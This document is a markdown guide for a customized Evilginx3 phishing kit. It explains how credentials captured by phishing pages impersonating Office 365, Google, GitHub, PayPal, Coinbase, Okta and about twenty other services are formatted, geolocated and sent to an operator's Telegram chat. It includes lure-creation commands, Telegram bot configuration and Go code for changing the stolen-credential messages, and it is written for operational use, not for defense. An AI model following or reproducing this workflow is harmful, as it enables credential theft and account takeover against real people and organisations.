# Custom Session Formatting Guide

## Overview

Evilginx3 now includes **custom session formatting** with **IP geolocation** for all phishlets. When credentials are captured, they are automatically formatted and sent to Telegram in a service-specific format.

---

## Features

1. **IP Geolocation** - Automatically looks up city, region, and country for each captured session
2. **Service-Specific Formatting** - Each phishlet has a custom format optimized for that service
3. **User Fingerprinting** - Captures IP, location, user-agent, and authentication method
4. **Real-time Notifications** - Formatted sessions sent to Telegram instantly

---

## Format Examples

### O365 / Office 365

```
raptor 🔥 (o365) 🔥
        {
    "officePassword": "P@ssw0rd123",
    "loginFmt": "john.doe@company.com"
}

(##      USER FINGERPRINTS       ##

IP: 192.168.1.100
LOCATION: Phoenix, Arizona, US
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36)
```

### GoDaddy (when detected via O365 phishlet)

```
raptor 🔥 (o365) 🔥
        {
    "serviceUsername": "admin@domain.com",
    "servicePassword": "Service123",
    "godaddyUsername": "godaddy_user",
    "godaddyPassword": "GoDaddy456"
}

(##      USER FINGERPRINTS       ##

IP: 192.168.1.101
LOCATION: Fayetteville, North Carolina, US
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36)
```

### Google / Gmail

```
raptor 🔥 (google) 🔥
        {
    "email": "user@gmail.com",
    "password": "MyPassword123"
}

(##      USER FINGERPRINTS       ##

IP: 203.0.113.45
LOCATION: San Francisco, California, US
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36)
```

### GitHub

```
raptor 🔥 (github) 🔥
        {
    "username": "developer123",
    "password": "GitHubPass456"
}

(##      USER FINGERPRINTS       ##

IP: 198.51.100.78
LOCATION: Seattle, Washington, US
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36)
```

### Slack

```
raptor 🔥 (slack) 🔥
        {
    "email": "employee@company.slack.com",
    "password": "SlackPass789",
    "workspace": "company-workspace"
}

(##      USER FINGERPRINTS       ##

IP: 203.0.113.90
LOCATION: Austin, Texas, US
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36)
```

---

## Supported Phishlets

All phishlets have custom formatting:

### Enterprise/Business
- **o365** - Office 365 / GoDaddy (auto-detects which)
- **google** - Google Workspace / Gmail
- **github** - GitHub
- **slack** - Slack
- **zoom** - Zoom
- **salesforce** - Salesforce
- **docusign** - DocuSign
- **dropbox** - Dropbox

### Social Media
- **facebook** - Facebook
- **twitter** - Twitter/X
- **instagram** - Instagram
- **linkedin** - LinkedIn
- **discord** - Discord
- **telegram** - Telegram

### Consumer
- **apple** - Apple ID / iCloud
- **netflix** - Netflix
- **spotify** - Spotify
- **adobe** - Adobe Creative Cloud

### Finance/Crypto
- **amazon** - Amazon / AWS
- **paypal** - PayPal
- **coinbase** - Coinbase (includes 2FA)
- **booking** - Booking.com

### SSO/Identity
- **okta** - Okta (includes MFA)

---

## How It Works

1. **Credentials Captured** - When user enters username/password
2. **Geolocation Lookup** - IP address is geolocated via ip-api.com
3. **Format Applied** - Service-specific format is applied
4. **Telegram Notification** - Formatted message sent to Telegram
5. **Session Saved** - Full session data saved to database

---

## IP Geolocation

The system uses **ip-api.com** (free API) for geolocation:

- **Cached** - Results are cached to avoid repeated lookups
- **Automatic** - Happens transparently when credentials are captured
- **Fallback** - If lookup fails, shows "Unknown" location

**Geolocation Data Includes:**
- City
- Region/State
- Country Code
- ISP/Organization
- Timezone

---

## Configuration

### Enable Telegram Notifications

```bash
# In Evilginx console
config telegram_token YOUR_BOT_TOKEN
config telegram_chat YOUR_CHAT_ID
config telegram on
```

### Test Telegram

```bash
telegram test
```

---

## Customization

### Adding Custom Fields

Edit `core/session_formatter.go` to customize the format for any phishlet.

**Example:** Adding custom field to Slack format:

```go
func (f *SessionFormatter) formatSlackSession(session *Session, location string, sessionID int) string {
	credentials := fmt.Sprintf(`{
    "email": "%s",
    "password": "%s",
    "workspace": "%s",
    "team_id": "%s"  // Custom field
}`, session.Username, session.Password, session.Custom["workspace"], session.Custom["team_id"])
	
	return fmt.Sprintf(`raptor 🔥 (slack) 🔥
        %s

(##      USER FINGERPRINTS       ##

IP: %s
LOCATION: %s
INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
USERAGENT: %s)`, credentials, session.RemoteAddr, location, session.UserAgent)
}
```

### Changing Format Style

You can modify the base format in `session_formatter.go`:

- Change the header: `raptor 🔥 (phishlet) 🔥`
- Modify JSON structure
- Add/remove fingerprint fields
- Change the layout

---

## Technical Details

### Geolocation API

Uses **ip-api.com** free tier:
- **Rate Limit**: 45 requests/minute
- **No API Key**: Required for free tier
- **Caching**: Results cached in memory
- **Fallback**: Gracefully handles API failures

### Session Flow

```
User Login
    ↓
Credentials Captured
    ↓
IP Geolocation Lookup (cached)
    ↓
Service-Specific Format Applied
    ↓
Sent to Telegram
    ↓
Saved to Database
```

### Performance

- **Geolocation**: ~50-200ms per lookup (first time only)
- **Caching**: Subsequent lookups instant
- **Non-blocking**: Telegram sends happen in goroutines
- **No Impact**: User experience unchanged

---

## Troubleshooting

### Telegram Not Receiving Formatted Messages

```bash
# Check Telegram configuration
config telegram

# Test connection
telegram test

# Enable Telegram
config telegram on
```

### Geolocation Not Working

- Check internet connectivity on VPS
- API may be rate-limited (45 req/min max)
- Falls back to "Unknown" location gracefully

### Wrong Format

- Ensure phishlet name matches exactly
- Check `session_formatter.go` for supported phishlets
- Generic format used for unknown phishlets

---

## Example Telegram Workflow

1. **Enable Telegram**:
   ```bash
   config telegram_token 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
   config telegram_chat 987654321
   config telegram on
   ```

2. **Create Lure**:
   ```bash
   lures create o365
   lures get-url 0
   ```

3. **User Visits Lure** → Enters credentials

4. **Telegram Receives**:
   ```
   raptor 🔥 (o365) 🔥
           {
       "officePassword": "captured_password",
       "loginFmt": "victim@company.com"
   }

   (##      USER FINGERPRINTS       ##

   IP: 203.0.113.45
   LOCATION: New York, New York, US
   INFORMATION: AUTHENTICATED WITH ANTIBOT(Private)
   USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...)
   ```

---

## Security Notes

- **No PII Logging**: Geolocation uses public APIs
- **Encrypted Transmission**: Telegram uses TLS
- **Data Retention**: Geolocation cache cleared on restart
- **Privacy**: No geolocation data stored to disk

---

**Custom session formatting active for all 24 phishlets!**

For more information, see:
- `core/session_formatter.go` - Implementation
- `TELEGRAM_NOTIFICATIONS.md` - Telegram setup
- `DEPLOYMENT_GUIDE.md` - Complete deployment

